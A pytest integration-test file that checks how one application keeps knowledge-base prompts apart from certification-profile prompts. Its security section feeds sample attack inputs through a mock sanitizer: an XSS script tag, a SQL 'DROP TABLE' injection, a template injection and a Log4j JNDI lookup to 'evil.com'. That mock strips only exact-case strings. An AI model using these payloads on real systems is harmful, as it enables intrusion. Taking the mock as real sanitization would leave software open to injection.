"""
Integration tests for prompt separation functionality.
Tests the complete separation of knowledge base and certification profile prompts.
"""

import pytest
import asyncio
from uuid import uuid4, UUID
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime

# Import optional dependencies with graceful handling
try:
    from sqlalchemy.ext.asyncio import AsyncSession
    HAS_SQLALCHEMY = True
except ImportError:
    AsyncSession = None
    HAS_SQLALCHEMY = False

try:
    from fastapi.testclient import TestClient
    HAS_FASTAPI = True
except ImportError:
    TestClient = None
    HAS_FASTAPI = False

# Import optional source modules with graceful handling
try:
    from src.models.knowledge_base_prompts import KnowledgeBasePrompts
    from src.models.certification import CertificationProfile
    from src.schemas.knowledge_base_prompts import (
        KnowledgeBasePromptsCreate,
        KnowledgeBasePromptsResponse
    )
    from src.schemas.certification import (
        CertificationProfileCreate,
        CertificationProfileResponse
    )
    from src.service.api.v1.endpoints.knowledge_prompts import (
        create_knowledge_base_prompts,
        get_knowledge_base_prompts
    )
    from src.service.api.v1.endpoints.certifications import (
        create_certification_profile,
        get_certification_profile
    )
    HAS_SOURCE_MODULES = True
except ImportError:
    HAS_SOURCE_MODULES = False


class TestPromptSeparationIntegration:
    """Test complete prompt separation between knowledge base and certification profiles."""

    def test_environment_setup(self):
        """Test that the separation test environment is properly configured."""
        import sys
        import os

        assert sys.version_info >= (3, 8), "Python 3.8+ required"
        assert os.path.exists("src"), "Source directory exists"
        assert os.path.exists("scripts/migrate_prompts.py"), "Migration script exists"

        print("✅ Prompt separation test environment ready")

    @pytest.mark.skipif(not HAS_SOURCE_MODULES, reason="Source modules not available")
    def test_separated_prompt_models_exist(self):
        """Test that separated prompt models are properly defined."""
        # Test knowledge base prompts model
        kb_prompts = KnowledgeBasePrompts(
            collection_name="test_collection",
            certification_name="Test Certification",
            document_ingestion_prompt="Test ingestion prompt"
        )

        assert kb_prompts.collection_name == "test_collection"
        assert hasattr(kb_prompts, 'document_ingestion_prompt')
        assert hasattr(kb_prompts, 'context_retrieval_prompt')
        assert hasattr(kb_prompts, 'semantic_search_prompt')
        assert hasattr(kb_prompts, 'content_classification_prompt')

        # Test certification profile model still has prompt columns
        profile = CertificationProfile(
            name="Test Profile",
            version="1.0",
            assessment_prompt="Test assessment",
            presentation_prompt="Test presentation",
            gap_analysis_prompt="Test gap analysis"
        )

        assert hasattr(profile, 'assessment_prompt')
        assert hasattr(profile, 'presentation_prompt')
        assert hasattr(profile, 'gap_analysis_prompt')
        assert profile.assessment_prompt == "Test assessment"

        print("✅ Separated prompt models exist and are properly configured")

    def test_prompt_storage_separation_validation(self):
        """Test that prompt storage is properly separated."""
        # Knowledge base prompt fields
        kb_fields = {
            'document_ingestion_prompt',
            'context_retrieval_prompt',
            'semantic_search_prompt',
            'content_classification_prompt'
        }

        # Certification profile prompt fields
        cert_fields = {
            'assessment_prompt',
            'presentation_prompt',
            'gap_analysis_prompt'
        }

        # Test that there's no overlap
        overlap = kb_fields & cert_fields
        assert len(overlap) == 0, f"Prompt fields should not overlap: {overlap}"

        # Test that they cover different purposes
        kb_purposes = ['knowledge_base_operations', 'document_processing', 'content_retrieval']
        cert_purposes = ['assessment_generation', 'presentation_creation', 'gap_analysis']

        assert len(set(kb_purposes) & set(cert_purposes)) == 0, "Prompt purposes should be distinct"

        print("✅ Prompt storage separation validated")

    @pytest.mark.skipif(not HAS_SOURCE_MODULES, reason="Source modules not available")
    @pytest.mark.asyncio
    async def test_independent_prompt_operations(self):
        """Test that knowledge base and certification prompts operate independently."""
        # Mock database session
        mock_db_session = AsyncMock(spec=AsyncSession)

        # Test knowledge base prompt creation
        kb_create_data = KnowledgeBasePromptsCreate(
            collection_name="aws_test_collection",
            certification_name="AWS Test Certification",
            document_ingestion_prompt="KB ingestion prompt",
            context_retrieval_prompt="KB retrieval prompt"
        )

        # Test certification profile creation
        cert_create_data = CertificationProfileCreate(
            name="AWS Test Certification",
            version="1.0",
            provider="AWS",
            assessment_prompt="Cert assessment prompt",
            presentation_prompt="Cert presentation prompt",
            gap_analysis_prompt="Cert gap analysis prompt",
            exam_domains=[]
        )

        # Mock the operations
        mock_kb_prompts = MagicMock()
        mock_kb_prompts.id = uuid4()
        mock_kb_prompts.collection_name = kb_create_data.collection_name
        mock_kb_prompts.document_ingestion_prompt = kb_create_data.document_ingestion_prompt

        mock_cert_profile = MagicMock()
        mock_cert_profile.id = uuid4()
        mock_cert_profile.name = cert_create_data.name
        mock_cert_profile.assessment_prompt = cert_create_data.assessment_prompt

        with patch('src.service.api.v1.endpoints.knowledge_prompts.create_knowledge_base_prompts') as mock_kb_create, \
             patch('src.service.api.v1.endpoints.certifications.create_certification_profile') as mock_cert_create:

            mock_kb_create.return_value = mock_kb_prompts
            mock_cert_create.return_value = mock_cert_profile

            # Create both types of prompts
            kb_result = await create_knowledge_base_prompts(kb_create_data, mock_db_session)
            cert_result = await create_certification_profile(cert_create_data, mock_db_session)

            # Verify they were created independently
            assert kb_result.collection_name == "aws_test_collection"
            assert kb_result.document_ingestion_prompt == "KB ingestion prompt"

            assert cert_result.name == "AWS Test Certification"
            assert cert_result.assessment_prompt == "Cert assessment prompt"

            # Verify no cross-contamination
            assert not hasattr(kb_result, 'assessment_prompt')
            assert not hasattr(cert_result, 'document_ingestion_prompt')

        print("✅ Independent prompt operations validated")

    def test_prompt_data_flow_separation(self):
        """Test that data flows are properly separated."""
        # Simulate UI to database data flow for knowledge base prompts
        kb_ui_data = {
            "collection_name": "test_kb",
            "document_ingestion_prompt": "UI KB prompt",
            "context_retrieval_prompt": "UI retrieval prompt"
        }

        # Simulate UI to database data flow for certification prompts
        cert_ui_data = {
            "profile_id": str(uuid4()),
            "assessment_prompt": "UI assessment prompt",
            "presentation_prompt": "UI presentation prompt"
        }

        # Test data transformation for knowledge base prompts
        kb_transformed = {
            "collection_name": kb_ui_data["collection_name"],
            "document_ingestion_prompt": kb_ui_data["document_ingestion_prompt"],
            "context_retrieval_prompt": kb_ui_data["context_retrieval_prompt"],
            "certification_name": "Derived from UI",
            "version": "v1.0",
            "is_active": True
        }

        # Test data transformation for certification prompts
        cert_transformed = {
            "assessment_prompt": cert_ui_data["assessment_prompt"],
            "presentation_prompt": cert_ui_data["presentation_prompt"],
            "gap_analysis_prompt": None  # Optional field
        }

        # Verify transformations maintain separation
        kb_keys = set(kb_transformed.keys())
        cert_keys = set(cert_transformed.keys())

        assert len(kb_keys & cert_keys) == 0, "Transformed data should have no overlapping keys"

        # Verify data flow integrity
        assert kb_transformed["document_ingestion_prompt"] == kb_ui_data["document_ingestion_prompt"]
        assert cert_transformed["assessment_prompt"] == cert_ui_data["assessment_prompt"]

        print("✅ Prompt data flow separation validated")

    def test_migration_scenario_validation(self):
        """Test the migration from coupled to separated prompts."""
        # Simulate legacy data structure
        legacy_profile_data = {
            "id": str(uuid4()),
            "name": "Legacy Certification",
            "version": "1.0",
            "assessment_template": {
                "_chromadb_prompts": {
                    "assessment_prompt": "Legacy assessment prompt",
                    "presentation_prompt": "Legacy presentation prompt",
                    "gap_analysis_prompt": "Legacy gap analysis prompt",
                    "document_ingestion_prompt": "Legacy ingestion prompt",
                    "context_retrieval_prompt": "Legacy retrieval prompt"
                },
                "_metadata": {
                    "provider": "Legacy Provider"
                }
            }
        }

        # Simulate migration transformation
        migrated_kb_data = {
            "collection_name": f"{legacy_profile_data['name'].lower().replace(' ', '_')}_v{legacy_profile_data['version']}",
            "certification_name": legacy_profile_data["name"],
            "document_ingestion_prompt": legacy_profile_data["assessment_template"]["_chromadb_prompts"]["document_ingestion_prompt"],
            "context_retrieval_prompt": legacy_profile_data["assessment_template"]["_chromadb_prompts"]["context_retrieval_prompt"]
        }

        migrated_cert_data = {
            "assessment_prompt": legacy_profile_data["assessment_template"]["_chromadb_prompts"]["assessment_prompt"],
            "presentation_prompt": legacy_profile_data["assessment_template"]["_chromadb_prompts"]["presentation_prompt"],
            "gap_analysis_prompt": legacy_profile_data["assessment_template"]["_chromadb_prompts"]["gap_analysis_prompt"]
        }

        migrated_template_data = {
            "_metadata": legacy_profile_data["assessment_template"]["_metadata"]
            # Note: _chromadb_prompts should be removed
        }

        # Verify migration preserves data integrity
        assert migrated_kb_data["document_ingestion_prompt"] == "Legacy ingestion prompt"
        assert migrated_cert_data["assessment_prompt"] == "Legacy assessment prompt"
        assert "_chromadb_prompts" not in migrated_template_data

        # Verify separation
        kb_keys = set(migrated_kb_data.keys())
        cert_keys = set(migrated_cert_data.keys())
        assert len(kb_keys & cert_keys) == 0, "Migrated data should be properly separated"

        print("✅ Migration scenario validation passed")

    def test_api_endpoint_separation(self):
        """Test that API endpoints are properly separated."""
        # Knowledge base prompt endpoints should be separate
        kb_endpoints = [
            "/knowledge-prompts/",
            "/knowledge-prompts/{collection_name}",
        ]

        # Certification profile endpoints should handle profile prompts
        cert_endpoints = [
            "/certifications/",
            "/certifications/{profile_id}",
        ]

        # Verify endpoint separation
        kb_patterns = {endpoint.split('/')[1] for endpoint in kb_endpoints}
        cert_patterns = {endpoint.split('/')[1] for endpoint in cert_endpoints}

        assert len(kb_patterns & cert_patterns) == 0, "API endpoints should be properly separated"

        # Verify endpoint purposes
        assert "knowledge-prompts" in kb_patterns, "Knowledge base prompts should have dedicated endpoints"
        assert "certifications" in cert_patterns, "Certification profiles should retain existing endpoints"

        print("✅ API endpoint separation validated")

    def test_frontend_component_separation(self):
        """Test that frontend components are properly separated."""
        # Test component interfaces
        kb_component_props = {
            'collectionName',
            'certificationName',
            'initialPrompts',  # KnowledgeBasePromptConfig
            'onPromptsChange'
        }

        cert_component_props = {
            'profileId',
            'certificationName',
            'initialPrompts',  # CertificationPromptConfig
            'onPromptsChange',
            'certificationContext'
        }

        # Verify component separation
        shared_props = kb_component_props & cert_component_props
        expected_shared = {'certificationName', 'initialPrompts', 'onPromptsChange'}

        assert shared_props == expected_shared, f"Components should only share expected props: {expected_shared}"

        # Verify unique props
        kb_unique = kb_component_props - shared_props
        cert_unique = cert_component_props - shared_props

        assert 'collectionName' in kb_unique, "KB component should have collection-specific props"
        assert 'profileId' in cert_unique, "Cert component should have profile-specific props"
        assert 'certificationContext' in cert_unique, "Cert component should have context props"

        print("✅ Frontend component separation validated")

    def test_logging_correlation_support(self):
        """Test that enhanced logging supports correlation across separated systems."""
        correlation_id = str(uuid4())

        # Simulate logging for knowledge base prompt operation
        kb_log_entry = {
            "correlation_id": correlation_id,
            "step": "kb_prompt_create",
            "component": "knowledge_prompts_api",
            "message": "Creating knowledge base prompts",
            "data": {
                "collection_name": "test_collection",
                "prompt_count": 4
            }
        }

        # Simulate logging for certification prompt operation
        cert_log_entry = {
            "correlation_id": correlation_id,  # Same correlation ID
            "step": "cert_prompt_update",
            "component": "certification_api",
            "message": "Updating certification prompts",
            "data": {
                "profile_id": str(uuid4()),
                "prompt_fields": ["assessment_prompt", "presentation_prompt"]
            }
        }

        # Verify correlation tracking
        assert kb_log_entry["correlation_id"] == cert_log_entry["correlation_id"]
        assert kb_log_entry["component"] != cert_log_entry["component"]
        assert "kb_prompt" in kb_log_entry["step"]
        assert "cert_prompt" in cert_log_entry["step"]

        # Verify structured logging
        required_fields = {"correlation_id", "step", "component", "message"}
        assert required_fields.issubset(set(kb_log_entry.keys()))
        assert required_fields.issubset(set(cert_log_entry.keys()))

        print("✅ Logging correlation support validated")

    def test_backward_compatibility_considerations(self):
        """Test backward compatibility during transition period."""
        # Test that old _chromadb_prompts structure is recognized but deprecated
        legacy_structure = {
            "assessment_template": {
                "_chromadb_prompts": {
                    "assessment_prompt": "Legacy prompt",
                    "document_ingestion_prompt": "Legacy KB prompt"
                },
                "_metadata": {
                    "provider": "Test Provider"
                }
            }
        }

        # Test new structure
        new_structure = {
            "assessment_prompt": "New prompt",  # Direct column
            "presentation_prompt": "New presentation",
            "assessment_template": {
                "_metadata": {
                    "provider": "Test Provider"
                }
                # Note: no _chromadb_prompts
            }
        }

        # Verify migration path
        assert "_chromadb_prompts" in legacy_structure["assessment_template"]
        assert "_chromadb_prompts" not in new_structure["assessment_template"]
        assert "assessment_prompt" in new_structure  # Direct field

        # Verify metadata preservation
        assert legacy_structure["assessment_template"]["_metadata"]["provider"] == \
               new_structure["assessment_template"]["_metadata"]["provider"]

        print("✅ Backward compatibility considerations validated")


class TestPromptSeparationSecurity:
    """Test security aspects of prompt separation."""

    def test_environment_setup(self):
        """Test security test environment."""
        print("✅ Prompt separation security test environment ready")

    def test_prompt_access_isolation(self):
        """Test that prompt access is properly isolated."""
        # Knowledge base prompts should be collection-scoped
        kb_access_scope = {
            "collection_name": "aws_collection",
            "affects": "all_users_of_collection",
            "permissions": ["read", "write"],
            "isolation_level": "collection"
        }

        # Certification prompts should be profile-scoped
        cert_access_scope = {
            "profile_id": str(uuid4()),
            "affects": "individual_user_profile",
            "permissions": ["read", "write"],
            "isolation_level": "profile"
        }

        # Verify isolation
        assert kb_access_scope["isolation_level"] != cert_access_scope["isolation_level"]
        assert kb_access_scope["affects"] != cert_access_scope["affects"]

        # Verify no cross-access
        assert "profile_id" not in kb_access_scope
        assert "collection_name" not in cert_access_scope

        print("✅ Prompt access isolation validated")

    def test_prompt_data_sanitization(self):
        """Test that prompt data is properly sanitized."""
        test_inputs = [
            "Normal prompt text",
            "<script>alert('xss')</script>",
            "'; DROP TABLE knowledge_base_prompts; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com}",  # Log4j style
            "Very long prompt " + "A" * 10000,
            "Unicode: 你好 🌟 café naïve résumé"
        ]

        for test_input in test_inputs:
            # Test knowledge base prompt sanitization
            kb_sanitized = self._sanitize_prompt(test_input, "knowledge_base")
            assert isinstance(kb_sanitized, str), "KB prompt should be sanitized to string"

            # Test certification prompt sanitization
            cert_sanitized = self._sanitize_prompt(test_input, "certification")
            assert isinstance(cert_sanitized, str), "Cert prompt should be sanitized to string"

            # Verify no script injection
            assert "<script>" not in kb_sanitized.lower()
            assert "<script>" not in cert_sanitized.lower()

            # Verify no SQL injection patterns
            assert "drop table" not in kb_sanitized.lower()
            assert "drop table" not in cert_sanitized.lower()

        print("✅ Prompt data sanitization validated")

    def _sanitize_prompt(self, prompt: str, prompt_type: str) -> str:
        """Mock prompt sanitization function."""
        # In real implementation, this would use proper sanitization
        sanitized = prompt

        # Remove script tags
        sanitized = sanitized.replace("<script>", "").replace("</script>", "")

        # Remove SQL injection patterns
        sanitized = sanitized.replace("DROP TABLE", "").replace("drop table", "")

        # Limit length
        if len(sanitized) > 50000:
            sanitized = sanitized[:50000] + "..."

        return sanitized


if __name__ == "__main__":
    pytest.main([__file__, "-v"])